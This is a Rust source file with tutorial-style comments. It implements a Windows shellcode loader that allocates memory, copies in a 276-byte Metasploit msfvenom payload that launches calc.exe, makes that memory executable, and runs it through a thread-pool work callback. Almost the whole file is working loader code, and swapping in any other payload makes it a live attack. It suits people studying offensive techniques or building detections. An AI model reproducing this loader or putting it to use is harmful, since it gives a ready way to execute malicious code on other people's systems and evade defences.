/*
IMPORTS
*/

use windows::{
    core::*,
    Win32::{
        Foundation::*,
        System::{
            Memory::*,
            Threading::*,
        },

    },
};
/* unsafe = rust can perform dangerous operations, 
generally used for system-wide operations 
(shellcode_func > raw pointer to function pointer conversion in this context) 

extern "system"

This is the calling convention

What does that mean?

On Windows
extern "system"

means:

Uses Windows calling convention (stdcall / Microsoft ABI)
Matches what Windows API expects

-> Why this is REQUIRED here

Windows will call your function like this internally:

callback(instance, context, work);

If your function doesn’t match the expected ABI:
> crash / undefined behavior


now work_callback, it requires 3 arguments by default to be passed in the parameters

_instance: PTP_CALLBACK_INSTANCE

This represents the current execution instance of the callback

What is it?
A pointer to an internal Windows structure
Describes this specific run of your callback



Why _instance?
_instance

-> _ means:

“I’m not using this parameter”

So Rust won’t warn you.

You can ignore it safely in most cases.

context = data that you passed earlier

```
CreateThreadpoolWork(
    Some(work_callback),
    Some(shellcode_addr), <- THIS IS THE CONTEXT
    None
);
```

*mut c_void?
*mut → raw mutable pointer
c_void → “unknown type” (like void* in C)

Means:

“This is just a memory address. You decide what it is.”

How you use it

You cast it back:

let shellcode_ptr = context as *mut u8;

Now you can:

read/write memory
execute it (in your case)



_work: PTP_WORK

This is the work object itself

It represents:
the task created by CreateThreadpoolWork

*/
unsafe extern "system" fn work_callback(
    _instance: PTP_CALLBACK_INSTANCE,
    context: *mut core::ffi::c_void,
    _work: PTP_WORK
    ) {
    /* now you use "unsafe extern "system" fn()" cuz this is a dangerous operation right? 
    why fn()? 
    cuz you're gonna convert shellcode_func to a function.

    now what's std::mut::transmute(context)?
    THIS IS THE MOST INTERESTING PART
    it takes the context as a raw pointer and converts it into a function pointer!
    */ 
    let shellcode_func : unsafe extern "system" fn() = std::mem::transmute(context); // converts raw pointer to function pointer, very powerful and sensitive
    
    // calls the shelllcode_func as a function by calling it using parenthesis 
    shellcode_func();
}


// MACROS (you can just copy paste, or see other explainations online, i won't explain it here cuz it's not the important part of the context)
macro_rules! error {
    ($msg:expr, $($arg:expr), *) => {
        println!("[-] {}", format!($msg, $($arg), *));
        return Err(Error::from_win32());
    }
}

macro_rules! okey {
    ($msg:expr) => {
        println!("[+] {}", format!($msg));
    }
}

fn main() -> Result<()>
{

    // SHELLCODE GENERATED with METASPLOIT FOR calc.exe
    // msfvenom -p windows/x64/exec CMD=calc.exe -f rust
    let shellcode: [u8; 276] = [
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
        0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
        0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
        0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
        0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
        0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
        0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
        0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
        0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
        0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
        0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
        0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
        0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
        0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
        0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
    ];

    unsafe {
        okey!("alloc mem for the shellcode with RW perms");
        
        /* shellcode_addr here 
        None = the executable assigns address by itself automatically. 
        shellcode.len() is passed as dwLength 
        and MEM_RESERVE reserves memory and MEM_COMMIT allocates that reserved memory, 
        with PAGE_READWRITE perms on 4th param. */
        let shellcode_addr = VirtualAlloc(None, shellcode.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        // check if shellcode address is null (simple error handling lol)
        if shellcode_addr.is_null() {
            error!("VirtualAlloc failed: {}", GetLastError().0);
        }

        /* copy the shellcode to memory, 
        first parameter of copy_nonoverlapping is the source which is shellcode in this code 
        and then there's the destination (allocated memory) which is shellcode_addr here, 
        pass the count as shellcode_addr.len() here, why shellcode_addr.len() here? 
        cuz this is just cuz this function (copynonoverlapping) needs to know how many bytes it should copy.
        */ 
        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), shellcode_addr as *mut u8, shellcode.len());

        // old protection 
        let mut old_protection = PAGE_PROTECTION_FLAGS(0);

        // new protection, for that allocated shellcode address, pass the old protection as the 4th param
        let new_protection = VirtualProtect(shellcode_addr, shellcode.len(), PAGE_EXECUTE_READWRITE, &mut old_protection);

        // new protection error checking
        if new_protection.is_err() {
            error!("VirtualProtect failed: {}", GetLastError().0);
        }


        // Create a ThreadPool Work to execute the pre-defined work_callback along with shellcode address as the 2nd parameter 
        /* DON'T understand?
        LET ME Explain,
        it creates a threadpool “work item” — basically a task that Windows can run in a background thread.

        ====== CreateThreadpoolWork =====
        
        How it looks under the hood:
        
        PTP_WORK CreateThreadpoolWork(
          PTP_WORK_CALLBACK pfnwk,
          PVOID pv,
          PTP_CALLBACK_ENVIRON pcbe
        );

        
        ===== Parameters explained =====
        1. Some(work_callback)
        This is the function that will run.

        In Rust:

        unsafe extern "system" fn work_callback(
            instance: PTP_CALLBACK_INSTANCE,
            context: *mut c_void,
            work: PTP_WORK,
        )

        2. Some(shellcode_addr)

        This is the context pointer (data passed to your function)

        Inside your callback:

        let shellcode = context;

        You can pass anything:

        pointer to data
        struct
        buffer (like shellcode)
        
        3. None

        To execute it, you must call:

        SubmitThreadpoolWork(work);
        let work = CreateThreadpoolWork(Some(work_callback), Some(shellcode_addr), None)?;
        SubmitThreadpoolWork(work);

        Now Windows runs work_callback in a thread

        */
        let work = CreateThreadpoolWork(Some(work_callback), Some(shellcode_addr), None)?;

        // Submit the work to ThreadpoolWork
        SubmitThreadpoolWork(work);

        // Wait for the callbacks, 2nd parameter is fcancelpendingcallbacks, set it to false now in the current context.
        WaitForThreadpoolWorkCallbacks(work, false);

        // close the threadpool work
        CloseThreadpoolWork(work);
    }
    // returns Ok as function, required () here as argument cuz the function returns Result<()>
    Ok(())
}
